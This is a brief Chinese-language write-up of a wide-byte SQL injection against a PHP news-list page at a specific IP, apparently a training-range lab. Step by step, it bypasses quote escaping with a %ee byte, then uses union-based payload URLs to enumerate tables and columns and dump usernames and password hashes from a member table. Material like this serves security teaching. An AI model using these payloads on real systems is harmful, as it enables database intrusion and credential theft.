```
日常检测
http://219.153.49.228:45469/new_list.php?id=1' //正常页面
http://219.153.49.228:45469/new_list.php?id=1' --+ //正常页面
http://219.153.49.228:45469/new_list.php?id=1 and 1 = 2 --+ //正常页面
http://219.153.49.228:45469/new_list.php?id=1'//正常页面

推测后台SQL
select x from x where id = 1 // id 后面肯定不是int 如果是int 我们输入了字符 就会报错
第一次推测
select x from x where id = '1' // 我们输入的 ' 应该是被转义了 \'  首先想办法抵消这个转义  根据MYSQL编码规则，超过%7e的 就会把两个两个连在一起的看做一个字符 

构造验证URL
http://219.153.49.228:45469/new_list.php?id=1%ee' //果然报错
推测此时后台代码为
select x from x where id = '1%ee%5c'' limit 0,1
此时我们可以对单引号进行闭合了

开始进行注入
1.获取SELECT字段数
http://219.153.49.228:45469/new_list.php?id=-1%ee' order by 5 --+
结果：5

2.获取数据显示位置
http://219.153.49.228:45469/new_list.php?id=-1%ee' union select 1,2,3,4,5 --+
结果：3 5

3.获取当前数据库所有表
http://219.153.49.228:45469/new_list.php?id=-1%ee' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema = database()),4,5 --+
结果：notice,stormgroup_member

4.获取指定表的所有字段(此处的表名直接转成ascii对应的16进制就可以不用加单引号来表示是字符串)
http://219.153.49.228:45469/new_list.php?id=-1%ee' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name = 0x73746f726d67726f75705F6d656d626572 ),4,5 --+
结果：name,password,status

5.获取指定表中的指定字段内容
http://219.153.49.228:45469/new_list.php?id=-1%ee' union select 1,2,(select group_concat(name,0x2D,password) from stormgroup_member),4,5 --+
结果：
    mozhe-3114b433dece9180717f2b7de56b28a3
    mozhe-197e774a58381bb418fb1fb0b912fcb4
```